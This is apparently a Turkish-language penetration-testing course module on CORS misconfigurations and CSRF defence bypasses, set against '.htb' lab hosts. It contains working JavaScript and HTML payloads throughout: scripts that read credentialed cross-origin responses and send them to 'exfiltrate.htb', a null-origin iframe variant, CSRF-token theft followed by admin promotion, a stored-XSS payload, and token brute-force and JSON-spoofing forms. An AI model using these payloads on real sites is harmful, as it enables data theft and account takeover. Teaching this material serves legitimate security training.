Same-Origin politikasını ve CORS'u ayrıntılı olarak ele aldığımıza göre, web uygulamalarında güvenlik açıklarına yol açabilecek yaygın CORS yanlış yapılandırmalarını ve bunların nasıl tespit edileceğini inceleyeceğiz.

CORS yanlış yapılandırmalarına geçmeden önce, CORS yanlış yapılandırmalarının ne tür saldırı vektörlerine yol açabileceğini tartışalım. Çoğu saldırı, `Access-ControlAllow-Credentials` header'ının `true` olarak ayarlanmasını gerektirir, böylece kurbanın context'inde kimliği doğrulanmış requestlerle sonuçlanır. Bir CORS yanlış yapılandırması, saldırgan tarafından kontrol edilen bir domain'e Same-Origin politikasının bir istisnasının verilmesiyle sonuçlanırsa, ortaya çıkan güvenlik açığı CSRF güvenlik açıklarına benzer, ancak daha ciddidir. Same-Origin politikasının istisnası, saldırganın kontrolündeki domain'in cross origin request'inin response'una erişmesine izin verir. Request kimliği doğrulanmış bir context'den yapıldığından, response saldırganın erişebileceği ve dışarı sızabileceği potansiyel olarak hassas bilgiler içerir. Ayrıca, belirli CORS yapılandırmasına bağlı olarak, saldırgan potansiyel olarak kurbanın kimliğine bürünmek ve onun adına eylemler yürütmek için web uygulamasıyla etkileşime girebilir.

`Access-Control-Allow-Credentials` header ayarlanmazsa, saldırganlar artık bu saldırıları gerçekleştiremez. Ancak, iç web uygulamasındaki bir CORS yanlış yapılandırması, bir saldırganın herkese açık olmayan bilgileri dışarı sızdırmasını sağlayabilir.

Not: Aşağıdaki CORS yanlış yapılandırmalarından bazılarının başarılı bir şekilde kullanılması, gerçek dünyadaki bir web uygulamasında session cookie üzerinde SameSite=None cookie attribute'unu gerektirebilir.


### Arbitrary Origin Reflection
#### Background

`Access-Control-Allow-Origin` header'ı, Same-Origin politikasını atlamasına izin verilen origin'i içerir ve böylece tarayıcı originin response'a erişmesine izin verir. Ek olarak, header bir wildcard karaktere ( `*` ) ayarlanabilir, bu da tüm originlere Same-Origin policy'nin atlanmasına izin verilmesiyle sonuçlanır. Ancak, güvenlik nedenleriyle, bu `Access-Control-Allow-Credentials: true` header'ı ile birleştirilemez, yani wildcard karakter yalnızca kimlik bilgileri olmadan kullanılabilir.

Not: `http://*.vulnerablesite.htb` gibi bir origin ve wildcard karakter kombinasyonu geçersizdir.

Ancak, bazı web uygulamalarının birden fazla origin için kimlik bilgilerine izin vermesi gerekir. Örneğin, `http://api.vulnerablesite.htb` adresinde çalışan bir API'nin kimlik doğrulaması gerektirdiği ve `http://site1.vulnerablesite.htb` ve `http://site2.vulnerablesite.htb` gibi birden fazla domain tarafından kullanıldığı bir senaryo düşünün. Bunu uygulamak için, bir web uygulaması request'in Origin header'ını okuyabilir ve bunu response'daki `Access-Control-Allow-Origin` header'ında yansıtabilir. Bu, `Access-Control-AllowCredentials: true` header'ıyla birlikte wildcard origin ile  aynı senaryoyu etkili bir şekilde sonuçlandırır, ancak CORS standardı tarafından açıkça engellenmez.

Rastgele originleri yansıtan bir CORS yanlış yapılandırmasını belirlemek için, web uygulamasının `Access-Control-Allow-Origin` header'ını `Origin` header'ında alınan değere ayarladığı örnekleri aramamız gerekir. Daha sonra ilgili isteği Burp Repeater'a gönderebilir ve `Origin` header'ını `thisdoesnotexist.whatever.htb` gibi sahte bir değerle değiştirebilir ve bu domainin `AccessControl-Allow-Origin` response header'ında bulunup bulunmadığını kontrol edebiliriz. Eğer öyleyse, web uygulaması bu CORS yanlış yapılandırmasından muzdariptir.


### Exploitation

Bu durumdan faydalanmak için bir saldırgan, web sunucusunda aşağıdakine benzer bir payload'u keyfi bir originle, örneğin `http://exploitserver.htb/exploit` adresinde barındırabilir:

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
```

Tarayıcı `http://api.vulnerablesite.htb` adresinde yanlış yapılandırılmış API için geçerli kimlik bilgilerini saklarken kurbanın `http://exploitserver.htb/exploit` adresindeki payload'a gittiğini varsayalım. Bu durumda, verilere kurbanın geçerli session'ından erişilir ve güvensiz CORS yapılandırması nedeniyle saldırgana aktarılır.

Payload'u barındıran siteye eriştikten sonra, kurbanın tarayıcısı `http://api.vulnerablesite.htb/data` adresine kimlik bilgileri, yani session cookie'leri ile cross-origin request gönderir:

![Pasted image 20250602144455.png](/img/user/resimler/Pasted%20image%2020250602144455.png)

Response, CORS header'ındaki origini yansıttığından ve kimlik bilgilerine izin verdiğinden, saldırganın origini `http://exploitserver.htb`'a Same-Origin politikasının bir istisnası verilir. Bu nedenle, payload kodunun response'a erişmesine izin verilir ve bunu exfiltration sunucusuna göndererek exfiltrate eder:

![Pasted image 20250602144534.png](/img/user/resimler/Pasted%20image%2020250602144534.png)

Dolayısıyla, bu CORS yanlış yapılandırması, geçerli kimlik bilgilerine sahip olmayan bir saldırganın, kimlik doğrulama ile korunuyor olsa bile API'den veri okumasına olanak tanır.


### Uygun Olmayan Origin Whitelist

Bir web uygulaması rastgele origin'leri yansıtmak yerine, bir origin'i yansıtmadan önce güvenilir origin'lerden oluşan bir whitelist'e karşı kontrol etmelidir. Bu kontrol yanlış yapılırsa, bir saldırgan bunu atlayabilir ve güvenilmeyen bir origin için Same-Origin exception elde edebilir. Özellikle, bir originin prefix veya suffix'ini kontrol eden uygulamalar savunmasız olabilir.

Bir web uygulamasının yaygın bir hedefi, belirli bir originin tüm subdomain'lerine güvenmektir. Örneğin, http://api.vulnerablesite.htb adresinde barındırılan bir API'nin, yalnızca kardeş subdomain'lere Same-Origin policy exception verildiğini doğrulamak için `vulnerablesite.htb` string'i ile bitip bitmediğini kontrol ederek gelen origin header'larını doğruladığını varsayalım. API, güvenmeden önce origin için bir kontrol uygularken, kontrol yalnızca `vulnerablesite.htb`'nin subdomain'lerini değil, `vulnerablesite.htb` ile biten tüm domain'leri kapsadığı için yanlış uygulanmıştır.


### Exploitation

Bu CORS yanlış yapılandırmasını exploit etmek, saldırgan verileri dışarı sızdırmak için aynı payload'u kullanabileceğinden, keyfi origin yansımasını istismar etmekle aynıdır. Bununla birlikte, origin kontrol edildiğinden, saldırganın payload'u barındırabileceği origin üzerinde sınırlamalar vardır. Postfix eşleşmesi nedeniyle, bir saldırgan istismar için `http://exploitserver.htb` originini kullanamaz, ancak payload'u barındırmak için `http://attackervulnerablesite.htb` gibi `vulnerablesite.htb` ile biten herhangi bir origini seçebilir.


### Trusted null origin

`Access-Control-Allow-Origin` header'ı yalnızca güvenilir bir origini ve bir wildcard karakteri değil, aynı zamanda `null` origini gösteren `null` değerini de destekler. Bunun pratikte kullanılmaması gerekirken, bazı web uygulamaları anlamının yanlış anlaşılması nedeniyle bunu uygulayabilir. Bir saldırgan, daha sonra güvenilen bir cross-origin request üzerinde null origin'i zorlamak için çeşitli yöntemler kullanabilir ve bu da Same-Origin policy istisnasına neden olur.

Bu yanlış yapılandırmayı tespit etmek için `null` originine açıkça güvenilen örnekleri belirlemeliyiz. Bunu başarmak için `Access-ControlAllow-Origin` CORS header'ında `null` değerini arayabiliriz.


### Exploitation

Bir saldırganın bu yanlış yapılandırmadan yararlanmak için cross origin isteğinde `null` origin sağlaması gerekir. Herhangi bir origin, sandbox'lı bir iframe kullanarak bunu başarabilir:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>"></iframe>
```

Bu payload kullanıldığında, exploit önceki yanlış yapılandırmalarla aynıdır. Ancak, sandbox'lı iframe, cross origin isteğinde `null` origin ile sonuçlanır:

![Pasted image 20250602145203.png](/img/user/resimler/Pasted%20image%2020250602145203.png)


### Lokal ağın hedeflenmesi

Web uygulaması CORS'u kimlik bilgilerine izin verecek şekilde yapılandırmamış  bile, bir saldırgan bir güvenlik duvarı, reverse proxy veya NAT arkasında lokal bir ağda çalışan ve public erişime açık olmayan web uygulamalarını hedef alabilir. Bu iç web uygulamaları kimlik doğrulaması gerektirmiyorsa ve saldırganın originine güvenen bir CORS yanlış yapılandırması içeriyorsa veri sızıntısı mümkün olabilir.

Kimlik doğrulama gerekmiyorsa, `Access-Control-Allow-Credentials` CORS header'ıda da gerekli değildir. Bu nedenle, şimdiye kadar tartışılan CORS yanlış yapılandırmalarına ek olarak, wildcard karakter origini de bu durumlarda istismar edilebilir bir yanlış yapılandırmaya neden olur. Örneğin, kimlik doğrulama gerektirmeyen internal API'nin `http://172.16.0.2` adresinde barındırıldığını varsayalım. Ek olarak, API `Access-Control-Allow-Origin`'de bir wildcard karakter belirler ve böylece tüm originlere güvenir.


### Exploitation

API'nin tek koruması, yalnızca internal ağdan erişilebilir olmasıdır; ancak, wildcard origin (joker kaynak) nedeniyle saldırgan kontrolündeki herhangi bir originin, bir kurban API'ye erişebiliyorsa verileri dışarı sızdırmasına olanak tanır. Herhangi bir kimlik doğrulama gerekmediği için, payload içinde **`withCredentials`** seçeneğini ayarlamamız gerekmez.

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://172.16.0.2/data', true);
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
```

Payload'u açan kurbanın internal API ile aynı internal ağda olduğunu ve dolayısıyla ona erişebileceğini varsayalım. Bu durumda, kurbanın tarayıcısı internal ağ içinde cross-origin request'i yapar:

![Pasted image 20250602145712.png](/img/user/resimler/Pasted%20image%2020250602145712.png)

Response daha sonra saldırgana sızdırılır ve public olarak erişilemeyen web uygulamalarından veri sızdırılmasını sağlar

Dahası, saldırganın yanlış yapılandırılmış uygulamanın çalıştığı IP adresini ve portu bilmesine gerek yoktur, ancak uygulama bulunana kadar farklı IP adresleri ve port kombinasyonları talep etmeye çalışarak internal ağı taramak için payload'u geliştirebilir.

**Hedef aldığımız web uygulamasına göre payload'larımızı geliştirebilir ve ince ayar yapabiliriz.** Örneğin, tüm sayfayı bir GET parametresinde göndermek genelde iyi bir uygulama değildir, çünkü URL uzunluğu sınırsız değildir. Sayfa çok büyükse payload başarısız olabilir. Bunun yerine, bir POST parametresi kullanmak daha iyidir. Alternatif olarak, veriyi bölerek birden fazla istekte gönderebilir ya da response'u ayrıştırıp yalnızca ilgi çekici öğeleri dışarı çıkararak URL'nin çok uzun olmamasını sağlayabiliriz. Bu, `getElementById` gibi fonksiyonlar kullanılarak elemanları arayarak gerçekleştirilebilir.

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      // parse the response
	  var doc = new DOMParser().parseFromString(xhr.response, 'text/html');

	  // exfiltrate only the interesting element
	  var msg = encodeURIComponent(doc.getElementById('secret').innerHTML);
      location = 'https://exfiltrate.htb/log?data=' + btoa(msg);
    };
    xhr.send();
</script>
```

Not: Laboratuvarda, web tarayıcınızın üçüncü taraf cookies ile ilgili ayarları exploit kodunuzun düzgün çalışmasını engelleyebilir. Ancak, exploit kurbana iletilirken bu sorunlar ortaya çıkmayacaktır. JavaScript konsolunda üçüncü taraf cookie'leriyle ilgili hatalara dikkat ettiğinizden ve tarayıcı ayarlarını buna göre yaptığınızdan emin olun.


# CORS Yanlış Yapılandırmaları ile CSRF Tokenlarını Atlama

Önceki bölümlerde tartışılan saldırı vektörlerine ek olarak, CORS yanlış yapılandırmaları CSRF savunmalarını atlamak ve uygun savunmalar uygulansa bile CSRF saldırıları gerçekleştirmek için de kullanılabilir.

CORS, session cookie'lerin cross-origin request'lerle birlikte gönderileceği şekilde yanlış yapılandırılırsa, yani `Access-Control-Allow-Credentials` ayarlanırsa, SameOrigin politikasını etkili bir şekilde atlayabiliriz. Bu durumda, bu bölümde tartışacağımız gibi, yaygın CSRF savunmaları etkisizdir.

### Defense Bypass: CSRF Tokens

Bir CORS yanlış yapılandırması nedeniyle Same-Origin politikasını atlayabilirsek, yaptığımız cross originli request'lerin response'larına erişebiliriz. Bu, geçerli bir CSRF tokenı oluşturan endpoint'e cross-origin request'i yapmamıza, onu okumamıza, durum değiştiren (state-changing) cross-origin request'imizin içine gömmemize ve geçerli CSRF tokenı ile state-changing cross-origin request'ini göndermemize olanak sağlar. Tüm bunlar kurbanın session'ında gerçekleştiğinden, CSRF token'ı düzgün bir şekilde kontrol edilse ve kurbanın kullanıcı session'ına bağlansa bile geçerlidir.

Ancak, kurbanın tarayıcısının kurbanın session cookie'sini JavaScript'ten yapılan request'lerle birlikte göndermesi için, savunmasız web uygulamasının CORS yanlış yapılandırmasına ek olarak `SameSite` cookie attribute'unu açıkça `None` olarak ayarlamasını gerektiriyoruz. Spesifikasyona göre, buna yalnızca cookie iletimine yalnızca güvenli HTTPS bağlantıları üzerinden izin veren `Secure` cookie attribute'u ile izin verilir. Cookie, şifrelenmemiş HTTP bağlantıları boyunca gönderilmeyecektir.

Bu kısıtlama nedeniyle, örnek web uygulamasına ve diğer tüm laboratuvar bileşenlerine yalnızca HTTPS kullanılarak erişilebilir. Web uygulamasını analiz edersek, web uygulamasının `Access-Control-Allow-Origin` ve `Access-Control-AllowCredentials` CORS header'larını ayarladığını fark edebiliriz, bu da bir CORS yanlış yapılandırması olup olmadığını kontrol etmemiz gerektiğini gösterir. Ayrıca, session cookie hem `Secure` hem de `SameSite=None` cookie attribute'larıyla ayarlanmıştır:

![Pasted image 20250602150955.png](/img/user/resimler/Pasted%20image%2020250602150955.png)

HTTP `Origin` header'ına farklı değerler girersek web uygulamasının davranışını analiz edebiliriz. Eğer rastgele bir değer girersek, web uygulamasının gerçekten de yanlış yapılandırıldığını görebiliriz, çünkü rastgele originler `Access-Control-Allow-Origin` CORS başlığına yansıtılır:

![Pasted image 20250602151029.png](/img/user/resimler/Pasted%20image%2020250602151029.png)

Uygun CSRF korumasını atlamak ve bir CSRF saldırısı gerçekleştirmek için `SameSite=None` cookie attribute'u ile bu CORS yanlış yapılandırmasından yararlanabiliriz. Bu saldırının potansiyel hedeflerini belirlemek için web uygulamasını daha fazla analiz edelim.

Daha önce olduğu gibi, web uygulaması kullanıcı hesaplarını adminlere yükseltme fonksiyonu uygular. Bu kez, ilgili POST request'i bir CSRF tokenı tarafından uygun şekilde korunmaktadır:

![Pasted image 20250602151130.png](/img/user/resimler/Pasted%20image%2020250602151130.png)

Kurbanın session'nında geçerli bir CSRF token'ı elde etmek için bir exploit yazalım ve daha sonra kurbanın kullanıcı hesabımızı administrator ayrıcalıklarına sahip olacak şekilde yükseltmesini sağlamak için ilgili cross-origin isteğini yapalım. CSRF tokenı `/profile.php` endpoint'ine yapılan bir GET request'ine response olarak gönderilir. Aşağıdakine benzer bir JavaScript kodu kullanarak ilgili request'i yapabilir, response'u ayrıştırabilir ve CSRF token'ını çıkarabiliriz:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);
```

Daha sonra, kullanıcımızı geçerli CSRF tokeni ile tanıtmak için cross-origin request oluşturabiliriz:

```js
var csrf_req = new XMLHttpRequest();
var params = `promote=htb-stdnt&csrf=${csrftoken}`;
csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

Her iki parçayı birleştirerek exploit sunucumuzda aşağıdaki payload'u elde edebiliriz:

```html
<script>
	// GET CSRF token
	var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
	var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

	// do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = `promote=htb-stdnt&csrf=${csrftoken}`;
    csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
	csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>
```

Exploit'imizi görüntüleyecek olursak, `/profile.php` adresine kimliği doğrulanmış bir GET request'i ve ardından geçerli CSRF token ile `/profile.php` adresine kimliği doğrulanmış bir POST request'i olduğunu görebiliriz. Bu nedenle, istismarımız çalışmalıdır. Kurbana ilettikten ve birkaç saniye bekledikten sonra, kullanıcımız admin'e yükseltilir. Böylece, CSRF korumasını atlamak ve başarılı bir CSRF saldırısı gerçekleştirmek için CORS yanlış yapılandırmasından başarıyla yararlandık:

![Pasted image 20241216235445.png](/img/user/resimler/Pasted%20image%2020241216235445.png)


# Misc CSRF Exploitation

Son birkaç bölümde CORS yanlış yapılandırmalarını tartıştıktan sonra, zayıf CSRF savunmalarını atlamak için kullanılabilecek farklı çeşitli CSRF saldırı vektörlerini inceleyeceğiz.


### SameSite Cookie'leri Atlamak için Saldırı Vektörlerini Birleştirme

Web tarayıcıları, request'in origin sitesine ve amaçlanan hedefe bağlı olarak isteklerle birlikte SameSite cookie'lerinin gönderilip gönderilmeyeceğine karar verir. Bu, birkaç bölüm önce görüldüğü gibi, Same-Origin politikası için dikkate alınan originden farklıdır. Temel fark, port ve subdomain'in sitenin bir parçası olarak kabul edilmemesidir. Bu nedenle, port ve subdomain farklı olsa bile iki domain aynı site olarak kabul edilir ve bazı durumlarda cross-origin bir request yine de SameSite olarak kabul edilir. Aşağıdaki örnekleri göz önünde bulundurun:

- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[http://sub.vulnerable.htb](http://sub.vulnerable.htb)** **SameSite**'tir.
- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[http://vulnerable.htb:9001](http://vulnerable.htb:9001)** **SameSite**'tir.
- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[http://sub.vulnerable.htb:9001](http://sub.vulnerable.htb:9001)** **SameSite**'tir.
- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[https://vulnerable.htb](https://vulnerable.htb)** **SameSite** **değildir**.
- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[http://exploitserver.htb](http://exploitserver.htb)** **SameSite** **değildir**.

SameSite cookie'lerinin getirdiği kısıtlamaları aşmak için bu davranışı kullanabileceğimiz birkaç yol vardır. Örneğin, session cookie'nin SameSite özelliği `Lax` olarak ayarlandığında, yalnızca GET request'leri gibi güvenli isteklerle gönderilir. Web uygulaması durum değiştiren (state-changing) ve GET requestleri ile yapılan herhangi bir endpoint içeriyorsa, SameSite koruması etkisizdir. Aynı durum, tüm durum değiştirme işlemleri POST requestlerini kullanıyorsa, ancak web uygulaması yanlış yapılandırılmışsa ve GET isteklerini kabul ediyorsa da geçerlidir.

`Strict` SameSite kısıtlamalarını atlamamız gerekiyorsa, yukarıda tartışılan yanlış yapılandırmayı hedef sitede client-side yönlendirmesi (redirect) ile birleştirebiliriz. Kurbanı client-side'a yeniden yönlendirme endpoint'ine gönderen bir payload yazarsak, client-side yeniden yönlendirme hedef site tarafından başlatılır ve bu nedenle SameSite olarak kabul edilir. Bu nedenle, SameSite attribute'u `Strict` olarak ayarlanmış olsa bile, kurbanın cookie'leri sonuçta ortaya çıkan request'le birlikte gönderilir. Kurbanı, durum değiştirme işlemleri için GET requestlerini kabul eden yanlış yapılandırılmış endpoint'e yönlendirirsek, başarılı bir CSRF saldırısı gerçekleştirebiliriz.

Not: Bu bypass yalnızca client-side yönlendirmelerde çalışır, HTTP `3xx` durum kodları gibi server-side yönlendirmelerde çalışmaz.

Örnek olarak, session cookie üzerinde SameSite cookie attribute'unu `Strict` olarak ayarlayan aşağıdaki web uygulamasını ele alalım:

![Pasted image 20250602152353.png](/img/user/resimler/Pasted%20image%2020250602152353.png)

İlginç bir şekilde, web uygulaması başarılı bir girişten sonra bizi geçici bir sayfaya yönlendiriyor ve bu sayfa da bizi profilimize yönlendiriyor:

![Pasted image 20241217000932.png](/img/user/resimler/Pasted%20image%2020241217000932.png)

Kaynak koduna baktığımızda, ortaya çıkan yönlendirmenin client-side yönlendirmesi olan bir HTML meta tag'ı kullanılarak uygulandığını görebiliriz:

![Pasted image 20250602152437.png](/img/user/resimler/Pasted%20image%2020250602152437.png)

Ayrıca, web uygulaması bu parametreyi yeniden yönlendirme URL'sinde kopyalıyor gibi göründüğünden, kullanıcı GET parametresi aracılığıyla URL'ye ek GET parametreleri enjekte edebiliriz:

![Pasted image 20250602152453.png](/img/user/resimler/Pasted%20image%2020250602152453.png)

Kullanıcı profili, birkaç bölüm önce tartışılan CSRF güvenlik açığına karşı savunmasızdır ve kullanıcımızı `/profile.php?promote=htb-stdnt` endpoint'i aracılığıyla yükseltmemizi sağlar. Ancak, SameSite attribute'u `Strict` olarak ayarlandığından, önceki payload'umuz çalışmayacaktır. Bunun yerine, başarılı bir CSRF exploit'i oluşturmak için client-side redirect'ten faydalanabiliriz. Bunu başarmak için, kurbanın endpoint'e eriştiğinden emin olmalıyız, bu da client-side redirect ile sonuçlanır. Ayrıca, kullanıcımızı admin ayrıcalıklarına yükseltmek için kurbanın `promote=htb-stdnt` GET parametresini içeren bir URL'ye yönlendirilmesi gerekir. Bunu aşağıdakine benzer bir payload ile başarabiliriz:

```html
<script>
document.location = "http://vulnerablesite.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
</script>
```

Bu payload'u exploit sunucusunda exploit'imiz olarak ayarlamak ve kurbana iletmek CSRF saldırısını başarıyla yürütür. Daha sonra, web uygulamasında admin ayrıcalıkları elde ederiz.

Son olarak, subdomain'ler SameSite olarak kabul edildiğinden, bunlardaki XSS açıklarından yararlanarak SameSite cookie kısıtlamalarını atlayabiliriz. Bu durumda, cross-origin request'i SameSite olarak kabul edilir. Bu nedenle, kurbanın cookie'leri request'le birlikte gönderilir ve başarılı bir CSRF saldırısı ile sonuçlanır. Bu senaryoyu ilerleyen bölümlerde daha ayrıntılı olarak inceleyeceğiz.

Örnek web uygulamamıza baktığımızda, session cookie üzerinde `SameSite=Strict` attribute'unu ayarlayarak cookie'nin herhangi bir cross-site request'i ile birlikte gönderilmesini engellediğini görebiliriz:

![Pasted image 20250602152703.png](/img/user/resimler/Pasted%20image%2020250602152703.png)

Ancak, yukarıda tartıştığımız gibi, subdomainler aynı site olarak kabul edilir. Bu nedenle, XSS'ye karşı potansiyel olarak savunmasız olan subdomainleri belirlemeye çalışalım. Bunu `gobuster` kullanarak yapabiliriz:

```shell-session
[!bash!]$ gobuster vhost -u http://vulnerablesite.htb -w /path/to/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

<SNIP>
===============================================================
2023/08/26 12:09:40 Starting gobuster in VHOST enumeration mode
===============================================================
Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
                                                              
===============================================================
2023/08/26 12:09:43 Finished
===============================================================
```

`http://guestbook.vulnerablesite.htb` subdomain'ine baktığımızda, birkaç bölüm önce gördüğümüz ziyaretçi defteri web uygulamasını tespit edebiliriz. Aynı XSS açığının hala mevcut olduğunu doğrulayabiliriz:

![Pasted image 20241217001611.png](/img/user/resimler/Pasted%20image%2020241217001611.png)

Ziyaretçi defteri girişlerini izleyen adminin `http://vulnerablesite.htb` adresindeki ana uygulamada da session açtığını varsayarsak, SameSite kısıtlamasını atlamak ve adminin kullanıcımızı admin konumuna yükseltmesini sağlamak için bu XSS açığını kötüye kullanabiliriz. Bunu yapmak için, admin kullanıcıyı ilgili POST request'ine göndermeye zorlamamız gerekir; bunu da aşağıdaki XSS payload'u ile başarabiliriz:

```html
<script>
    var csrf_req = new XMLHttpRequest();
    var params = 'promote=htb-stdnt';
    csrf_req.open('POST', 'http://vulnerablesite.htb/profile.php', false);
	csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>
```

Payload'umuzu ziyaretçi defterine gönderdikten ve admin kullanıcının sayfaya erişmesi için birkaç saniye bekledikten sonra, CSRF saldırısının başarılı olduğunu ve kullanıcımızın terfi ettiğini görebiliriz:

![Pasted image 20241217001729.png](/img/user/resimler/Pasted%20image%2020241217001729.png)


## Weak Token Brute-Force

Session Security modülünde kısaca tartışıldığı gibi, başarılı bir CSRF saldırısı gerçekleştirmek için zayıf CSRF token'ları bypass edilebilir. CSRF token'ı bir kullanıcı session'ına bağlı olmadığında basit bypasslar meydana gelebilir. Bu durumda, savunmasız web uygulamasına erişen bir saldırgan, kendi session'ından gelen cross origin request'ine geçerli bir CSRF token'ı ekleyebilir. Bu durumda backend, CSRF token'ı geçerli olduğu için kurbanın session'ından gelen cross-origin request'ini kabul edecektir. Bir başka örnek de CSRF token'larının tamamen rastgele olmadığı ve tahmin edilebilir olduğu durumlardır. CSRF token'ının nasıl oluşturulduğuna bağlı olarak (kullanıcı adı ya da geçerli zaman damgasının bir hash'i gibi), tek bir denemede tahmin edebilir ya da bir payload kullanarak brute-force yapabiliriz.

Bu kez, web uygulaması CSRF token'ları ile korunmuştur, böylece düz bir CSRF saldırısı artık başarılı olmayacaktır. Bununla birlikte, birden fazla CSRF token'ı elde edersek, bunun artan bir sayı olduğunu, potansiyel olarak bir sayaç gibi bir şey olduğunu ve bu nedenle muhtemelen brute-force'la zorlanabileceğini anlayabiliriz:

![Pasted image 20250602153117.png](/img/user/resimler/Pasted%20image%2020250602153117.png)

CSRF token'larını daha yakından analiz edersek, CSRF token'ının [Unix Timestamp](https://www.unixtimestamp.com/) olarak basitçe geçerli zaman olduğunu fark edebiliriz. Bu, CSRF token'ını tahmin edilebilir hale getirir ve CSRF saldırısını başarıyla gerçekleştirmek için çalışan bir exploit oluşturmamıza olanak tanır. Bunu yapmak için, kurbanın CSRF token'ını, yani kurbanın payload'umuza erişmeden önce `/profile.php` endpoint'ine en son ne zaman eriştiğini doğru bir şekilde tahmin etmeliyiz. Zamanlamayı tam olarak doğru yapmak zordur çünkü varsayılan SameSite `Lax` politikasının getirdiği kısıtlamalar nedeniyle JavaScript kodunu kullanarak CSRF token'ını dinamik olarak brute-force edemeyiz. Bu nedenle, tahmin edilen CSRF token'ını HTML formumuzda sabit kodlamamız ve her tahmin için değeri güncellememiz gerekir:

```html
<html>
  <body>
    <form method="GET" action="http://vulnerablesite.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="hidden" name="csrf" value="1692981700" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Bu, CSRF token'ını brute-force'la zorlamayı daha zor hale getirse ve dolayısıyla başarılı bir saldırı olasılığını azaltsa da, geçerli bir CSRF token'ını tahmin etmek ve zayıf korumayı atlamak mümkündür.


### Header Tabanlı Savunma Önlemlerinin Atlatılması

Header tabanlı CSRF koruma önlemleri yanlış uygulanırsa, diğer domain adı veya URL filtrelerine benzer şekilde bunları atlatabiliriz. Örneğin, savunmasız web uygulaması `http://vulnerablesite.htb` yalnızca `Referer` header'ında `vulnerablesite.htb` string'inin varlığını kontrol ediyorsa, payload'u `http://exploitserver.htb/somepath/vulnerablesite.htb` gibi bu string'i içeren bir URL'de barındırabiliriz. Benzer şekilde, `Referer` header'ının ilgili string ile bitip bitmediğini kontrol eden filtreleri de atlayabiliriz.


## JSON Request Body ile CSRF

Birçok modern web uygulaması POST request'indeki verilerin JSON olmasını bekler. Bu durumda, CSRF saldırılarını yalnızca belirli koşullar altında gerçekleştirebiliriz çünkü CSRF payload'u ile JSON formatlı POST parametreleri değil, yalnızca URL kodlu POST parametreleri gönderebiliriz. Ancak, yalnızca JSON verilerini kabul eden bir web uygulaması yine de CSRF'ye karşı savunmasız olabilir.

İlk olarak, web uygulamasının `Content-Type` header'ını belirtmemize izin veren bir CORS yanlış yapılandırmasından muzdarip olduğunu varsayalım. Bu durumda, header'ı basitçe `application/json` olarak ayarlayabilir ve JavaScript kodundan bir JSON body gönderebiliriz. Ancak bu, ek CORS yanlış yapılandırmasının mevcut olmasını gerektirir.

Alternatif olarak, web uygulaması request'de gönderilen `Content-Type` header'ını doğru bir şekilde kontrol etmezse CSRF'ye karşı savunmasız olabilir. HTML tabanlı bir CSRF payload'u yalnızca HTML formundaki `enctype` attribute'ını kullanarak ayarlayabileceğimiz `application/x-www-form-urlencoded`, `text/plain` ve `multipart/form-data` Content-Type header'ını destekler. Böylece web uygulaması Content-Type header'ını kontrol ederek request body'nin beklenen JSON formatında olmadığını belirleyebilir ve böylece CSRF request'ini potansiyel olarak reddedebilir. Ancak, web uygulaması Content-Type header'ını düzgün bir şekilde kontrol etmez ve yalnızca request body'nin syntax'ına güvenirse, aşağıdakine benzer bir CSRF payload'u ile bir JSON body'si taklit edebiliriz:

```html
<html>
  <body>
    <form method="POST" action="http://csrf.vulnerablesite.htb/profile.php" enctype="text/plain">
      <input type="hidden" name='{"promote": "htb-stdnt", "dummykey' value='": "dummyvalue"}' />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Bu CSRF payload'u aşağıdaki request'le sonuçlanır:

```http
POST /profile.php HTTP/1.1
Host: csrf.vulnerablesite.htb
Content-Length: 53
Content-Type: text/plain

{"promote": "htb-stdnt", "dummykey=": "dummyvalue"}
```

